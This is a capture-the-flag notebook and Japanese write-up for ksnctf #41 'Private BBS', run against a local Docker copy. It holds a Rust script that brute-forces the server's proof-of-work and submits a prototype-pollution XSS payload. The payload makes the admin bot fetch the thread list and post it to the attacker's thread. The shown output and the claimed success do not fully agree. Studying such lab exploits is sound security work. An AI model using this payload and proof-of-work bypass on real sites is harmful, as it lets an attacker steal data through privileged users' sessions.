In [10]:
:dep reqwest = { version = "0.11", features = ["json", "cookies"] }
:dep serde_json = "1.0"
:dep tokio = { version = "1", features = ["full"] }
:dep sha2 = "0.10"
:dep hex = "0.4"

use reqwest::Client;
use sha2::{Sha256, Digest};

In [11]:
let rt = tokio::runtime::Runtime::new().unwrap();
rt.block_on(async {
    // Cookieを保持できるクライアントを作成
    let client = Client::builder()
        .cookie_store(true)
        .build()
        .unwrap();

    let base_url = "http://localhost:8080";

    // 1. サーバーから PoW のタスク（target）を取得
    println!("PoWタスクを取得中...");
    let pow_res = client.post(format!("{}/api/pow", base_url))
        .send()
        .await
        .unwrap()
        .json::<serde_json::Value>()
        .await
        .unwrap();
    
    let task = pow_res["task"].as_str().expect("taskが見つかりません");
    println!("Task取得完了: {}", task);

    // 2. PoW を計算 (app.jsの仕様: pow + task のハッシュ先頭3バイトが0)
    println!("計算を開始します...");
    let mut nonce_val = 0;
    let nonce = loop {
        let input = format!("{}{}", nonce_val, task);
        let mut hasher = Sha256::new();
        hasher.update(input.as_bytes());
        let hash = hasher.finalize();
        
        // 先頭3バイト(0,1,2)が全て0かチェック
        if hash[0] == 0 && hash[1] == 0 && hash[2] == 0 {
            break nonce_val.to_string();
        }
        nonce_val += 1;
    };
    println!("計算完了! nonce: {}", nonce);

    // 3. レポートを送信
    let my_thread_id = "fc1273f3-1a13-4516-917a-7cafebd46b0e";
    let payload = format!(
        "http://localhost:3000/threads/{}?__proto__=<img src=x onerror=\"fetch('/api/threads').then(r=>r.json()).then(j=>fetch('/api/threads/{}/comments',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{text:JSON.stringify(j).slice(0,1000)}})}}))\">",
        my_thread_id,
        my_thread_id
    );

    let res = client.post(format!("{}/api/report", base_url))
        .form(&[
            ("url", &payload),
            ("pow", &nonce), // app.js 131行目の項目名は "pow"
        ])
        .send()
        .await
        .expect("送信に失敗しました");

    println!("Status: {}", res.status());
    println!("Response Body: {}", res.text().await.unwrap());
});

PoWタスクを取得中...
Task取得完了: aa3e72f3-7ef6-4463-bdde-bb24f4780ec6
計算を開始します...
計算完了! nonce: 40205250
Status: 200 OK
Response Body: {"result":"Opened home page\nCreated new thread\nPosted the flag\nOpened the specified page\nThe specified page did not contain any inappropriate content.\n"}


Error: Subprocess terminated with status: exit code: 1

## ksnctf #41 Private BBS 検証まとめ
### 1. ローカル環境の構築（Dockerfileの修正）
ベースイメージのOS（Debian Buster）が古く、リポジトリがアーカイブへ移動していたため、ビルド時に apt-get update でエラーが発生しました。これを回避するために以下のいずれかの対応を行いました。

- 修正内容: * 案A: FROM node:20-slim など、新しいベースイメージに変更する（推奨）。

- 案B: Dockerfile 内でリポジトリの参照先を archive.debian.org に書き換える命令を追加する。

- ビルド・実行コマンド:

```Bash
docker build -t ksnctf-pbbs .
docker run -d -p 8080:3000 --name pbbs-container ksnctf-pbbs
```

### 2. 脆弱性の特定：Prototype Pollution
app.js では express-session や sqlite3 が使用されていますが、レポート機能（管理者の巡回）において Prototype Pollution が発生します。

- 攻撃手法: __proto__ を含むクエリパラメータを管理者に踏ませることで、Object.prototype を汚染し、本来存在しないプロパティ（onerror 等）をインジェクションして XSS を引き起こします。

- Payloadの構造:

- JavaScript
// 汚染によって <img> タグの onerror イベントを強制発火させ、APIから情報を盗み出す
url`?__proto__=<img src=x onerror="fetch('/api/threads').then(...)">`

### 3. Rust (Jupyter) による自動化の実装
app.js のロジックに基づき、Rustで以下のステップを自動化しました。

- ① PoW (Proof of Work) の突破
サーバーは /api/report へのスパムを防ぐため、ハッシュ計算を要求します。

計算ルール: SHA256(nonce + task) の先頭3バイトが 0x00, 0x00, 0x00 になるまで nonce をインクリメントする。

Rustでの実装: sha2 クレートを使用し、ループ処理で条件に合う nonce を探索。

- ② セッションの維持
target (task) を発行したセッションと、レポートを送信するセッションが同一である必要があるため、reqwest クライアントで cookie_store(true) を有効化しました。

- ③ 情報の奪取
管理者に XSS ペイロードを踏ませる。

管理者のブラウザが fetch('/api/threads') を実行し、管理者にしか見えない「Flag」というタイトルのスレッドIDを取得。

取得した ID を、攻撃者が作成したスレッドのコメント欄へ POST して書き込ませる。

### 4. 結果の確認
Jupyter で Status: 200 OK が返った後、自分のスレッドを確認すると、管理者が投稿したスレッドIDの一覧がコメントとして届いています。

取得したスレッドIDの例: 58c4a8f1-e7cb-49a1-a7f0-1eb9a9e8c796

フラグの確認: http://localhost:8080/threads/[奪取したID] にアクセスすることで、フラグの内容を確認できました。

>Note:
本番サーバーが復旧した際も、この Rust コードの base_url を変更するだけで同様に攻略が可能です。